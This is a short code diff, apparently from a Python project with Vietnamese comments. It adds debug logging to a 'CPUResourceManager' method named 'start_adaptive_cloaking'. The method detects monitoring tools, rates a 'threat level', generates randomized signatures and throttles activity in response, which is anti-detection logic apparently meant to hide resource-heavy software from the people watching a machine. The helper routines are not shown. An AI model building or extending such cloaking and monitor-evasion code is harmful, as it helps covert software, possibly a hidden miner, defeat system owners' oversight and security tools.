@@ -311,17 +311,28 @@ class CPUResourceManager(metaclass=_SingletonMeta):
         Bắt đầu adaptive cloaking system
         """
         try:
+            # ✅ DIAGNOSTIC: Log entry point với DEBUG level
+            self.logger.debug(f"🔍 [DIAGNOSTIC] start_adaptive_cloaking called")
+            self.logger.debug(f"📊 Current threat level: {self.current_threat_level}")
+            self.logger.debug(f"🎯 Anti-detection module: {type(self.anti_detection)}")
+            self.logger.debug(f"🎭 Signature randomizer: {type(self.signature_randomizer)}")
+            
             # Detect monitoring tools
             detected_monitors = self.anti_detection.detect_monitoring_tools()
+            self.logger.debug(f"🛡️ Detected monitors: {detected_monitors}")
+            
             self.current_threat_level = self.anti_detection.assess_threat_level(detected_monitors)
+            self.logger.debug(f"📈 Assessed threat level: {self.current_threat_level}")
             
             # Generate adaptive signature
             adaptive_signature = self.signature_randomizer.generate_dynamic_signature(60)
+            self.logger.debug(f"🎭 Generated adaptive signature: {adaptive_signature[:50]}...")
             
             # Start continuous monitoring
             self.anti_detection.continuous_threat_monitoring(
                 callback_function=self._handle_threat_level_change
             )
+            self.logger.debug("🔄 Continuous threat monitoring started")
             
             self.adaptive_throttling_active = True
             
